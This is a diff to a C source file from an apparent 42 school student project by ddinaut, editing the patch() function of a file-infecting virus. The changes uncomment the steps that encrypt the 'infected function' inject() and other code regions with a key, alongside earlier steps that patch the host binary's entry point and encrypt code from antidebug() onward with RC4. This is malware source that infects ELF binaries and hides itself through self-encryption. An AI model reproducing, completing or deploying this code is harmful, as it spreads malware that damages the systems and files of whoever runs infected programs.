@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/04/04 17:02:59 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/11 12:22:03 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/12 17:19:10 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -26,7 +26,7 @@ void	patch(t_data *data, uint8_t *map, size_t size)
 	_log(de, _strlen(de));
 #endif
 
-	/* revert_one(&data->key, (char*)inject, (size_t)patch - (size_t)inject); */
+	revert_one(&data->key, (char*)inject, (size_t)patch - (size_t)inject);
 
 	if (data->context == false || data->context != true)
 		goto next;
@@ -43,11 +43,9 @@ void	patch(t_data *data, uint8_t *map, size_t size)
 		goto next;
 	_memcpy(dst + 1, &data->bin_entry, 4);
 
-
-	/* // step 6.5 : encrypt infected function inject() */
-	/* dst = map + (data->virus.note->p_offset + ((size_t)inject - (size_t)start)); */
-	/* revert_one(&data->key, (char*)dst, (size_t)patch - (size_t)inject); */
-
+	// step 6.5 : encrypt infected function patch()
+	dst = map + (data->virus.note->p_offset + ((size_t)inject - (size_t)start));
+	revert_one(&data->key, (char*)dst, (size_t)patch - (size_t)inject);
 
 	// step 7 : Encrypt data : begin at antidebug() -> end lib
 	dst = map + (data->virus.note->p_offset + ((size_t)_rc4 - (size_t)start));
@@ -62,7 +60,8 @@ void	patch(t_data *data, uint8_t *map, size_t size)
 
 next:
 	_munmap(map, size);
-	/* update_one(&data->key, (char*)patch, (size_t)release - (size_t)patch); */
-	/* revert_one(&data->key, (char*)release, (size_t)end - (size_t)release); */
+	update_one(&data->key, (char*)patch, (size_t)release - (size_t)patch);
+	revert_one(&data->key, (char*)release, (size_t)erase - (size_t)release);
+
 	release(data);
 }
